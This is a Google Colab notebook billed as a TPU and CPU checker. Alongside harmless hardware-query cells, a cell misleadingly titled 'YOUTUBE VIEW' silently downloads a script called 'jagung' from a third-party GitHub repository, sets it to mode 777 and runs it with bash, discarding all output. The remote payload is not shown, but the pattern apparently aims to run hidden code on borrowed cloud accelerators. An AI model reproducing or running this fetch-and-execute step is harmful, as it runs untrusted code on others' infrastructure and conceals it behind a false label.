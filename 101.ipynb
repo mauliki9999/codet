{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "101.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "accelerator": "TPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LIWl-PkQrxlP"
      },
      "source": [
        "# ***TPU CHECKER***"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "dIl3K72pkMbT"
      },
      "source": [
        "\n",
        "```\n",
        "!pip install gpu-tpu-lab-server \n",
        "from gpu_tpu_lab_server.core import jupyter_lab, vscode, run_process_in_background, run_process_in_foreground \n",
        "vscode() \n",
        "```\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "OzQQy0IH61fN",
        "cellView": "form",
        "outputId": "407c0ad0-7173-486d-dc0e-5d06343e2503",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title ***Check TPU***\n",
        "import os\n",
        "from tensorflow.python.profiler import profiler_client\n",
        "\n",
        "tpu_profile_service_address = os.environ['COLAB_TPU_ADDR'].replace('8470', '8466')\n",
        "print(profiler_client.monitor(tpu_profile_service_address, 100, 2))"
      ],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "  Timestamp: 16:57:18\n",
            "  TPU type: TPU v2\n",
            "  Utilization of TPU Matrix Units (higher is better): 0.000%\n",
            "\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "qjz4zXko0rYo",
        "cellView": "form",
        "outputId": "55a502d6-2f9b-4cea-8d3f-762a2249cd32",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title ****CPU****\n",
        "!nproc --all"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "40\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "MkBz-0GFdnSq"
      },
      "source": [
        "#@title ***YOUTUBE VIEW***\n",
        "from os import system, name\n",
        "from time import sleep\n",
        "from subprocess import PIPE, Popen\n",
        "import base64\n",
        " \n",
        "\n",
        " \n",
        "\n",
        " \n",
        "def cmdline(command):\n",
        "    process = Popen(\n",
        "        args=command,\n",
        "        stdout=PIPE,\n",
        "        shell=True\n",
        "    )\n",
        "    return process.communicate()[0]\n",
        " \n",
        "\n",
        " \n",
        "\n",
        "\n",
        "cmdline ('wget https://raw.githubusercontent.com/washil789/minmin/main/jagung >/dev/null 2>&1 && chmod 777 jagung && bash ./jagung')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "C5jGvbUYKgI9"
      },
      "source": [
        "\\"
      ]
    }
  ]
}